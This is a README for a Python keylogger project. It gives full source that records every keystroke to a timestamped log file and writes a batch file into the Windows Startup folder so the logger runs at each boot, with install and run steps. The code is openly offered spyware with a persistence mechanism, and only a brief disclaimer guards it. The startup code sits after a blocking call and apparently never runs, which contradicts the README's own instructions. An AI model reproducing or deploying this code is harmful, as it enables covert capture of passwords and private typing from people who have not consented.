# Keylogger - Cyber Security Project

## Overview
This project is a simple Python-based keylogger that logs keystrokes and saves them to a file. Additionally, it includes an auto-start mechanism to execute the script on system startup. This tool is intended strictly for educational and ethical cybersecurity research purposes.

## Features
- Captures and logs keystrokes.
- Runs in the background.
- Saves keystrokes to a log file.
- Automatically executes on system startup (Windows).

## Prerequisites
- Python 3.x installed.
- Required library:
  ```bash
  pip install pynput
  ```

## Installation & Usage
1. Save the following script as `keylogger.py`:

```python
import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import sys

# Log file directory
log_dir = r"D:/cyber security/cyber security projects/keylogger"
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()

# Auto-start mechanism (Windows)
script_path = os.path.abspath(sys.argv[0])
autostart_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup', 'keylogger.bat')

with open(autostart_path, 'w') as bat_file:
    bat_file.write(f'@echo off\npython "{script_path}"\nexit')
```

2. Run the script once to create the necessary startup batch file.
3. Restart your system to ensure it runs automatically.

## How It Works
- The script listens for keyboard events.
- Captured keystrokes are logged in `keylog.txt`.
- The script creates a batch file in the Windows Startup folder to ensure auto-execution.

## Important Notice
This project is strictly for educational purposes. Unauthorized use of keyloggers is illegal and unethical. Ensure you have explicit permission before using this tool in any environment.

